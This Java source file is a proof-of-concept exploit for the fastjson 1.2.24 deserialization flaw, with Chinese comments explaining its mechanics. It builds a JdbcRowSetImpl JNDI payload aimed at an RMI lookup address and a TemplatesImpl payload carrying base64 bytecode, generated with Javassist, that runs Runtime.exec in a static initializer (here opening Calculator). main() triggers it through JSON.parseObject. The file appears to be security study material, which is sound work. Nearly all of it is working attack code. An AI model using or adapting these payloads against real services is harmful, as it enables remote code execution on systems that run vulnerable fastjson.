import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;


public class FastJsonLE1224 {
    public static String jdbcRowSetImpl() {
        /**
         * com.sun.rowset.JdbcRowSetImpl.setAutoCommit()
         *  com.sun.rowset.JdbcRowSetImpl.connect()
         *   var1.lookup(this.getDataSourceName());
         */
        String poc = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/refObj\", \"autoCommit\":true}";

        /**
         * 下面三种任选一种
         * JSON.parse(PoC);
         * JSON.parseObject(PoC);
         * JSONObject.parse(PoC);
         */
        return poc;
    }

    public static String templatesImpl() throws Exception {
        // 1.为什么parseObject需要Feature.SupportNonPublicField？
        // 没有setter的private为null 我们需要这个来为private赋值

        // 2.为什么需要_outputProperties属性？
        // 反序列化的时候会执行getter方法, 因为_outputProperties是Properties类型是Map的子类, 在执行反序列化的时候会执行相应的getter
        // 详见/com/alibaba/fastjson/util/JavaBeanInfo.java:504
        // 并且会执行smartMatch方法去掉_
        // 详见com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.smartMatch()

        // 3._bytecodes为什么需要base64编码？

        // 4._tfactory为什么为{}？


        /**
         * outputProperties -> /Users/xjj/.m2/repository/com/alibaba/fastjson/1.2.24/fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java:85
         * stylesheetDOM
         * uRIResolver
         */
        byte[] evilCode = getEvilBytes();
        String evilCodeBase64 = Base64.encodeBase64String(evilCode);
        final String templatesClazz = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String poc = "{\"@type\":\"" + templatesClazz + "\"," +
                "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                "\"_name\":\"\"," +
                "\"_tfactory\":{ }," +
                "\"_outputProperties\":{ }" +
                "}";
//        System.out.println(poc);
        return poc;
    }

    public static class Fake {
    }

    private static byte[] getEvilBytes() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(Fake.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "Xjj" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        return cc.toBytecode();
    }


    public static void main(String[] args) throws Exception {
        String poc = templatesImpl();
        JSON.parseObject(poc, Feature.SupportNonPublicField);
//        JSON.parse(poc, Feature.SupportNonPublicField);
//        JSON.parseObject(poc, Object.class, Feature.SupportNonPublicField);


        String poc2 = jdbcRowSetImpl();
//        JSON.parse(poc2);
//        JSON.parseObject(poc2);
//        JSONObject.parse(poc2);
    }



}
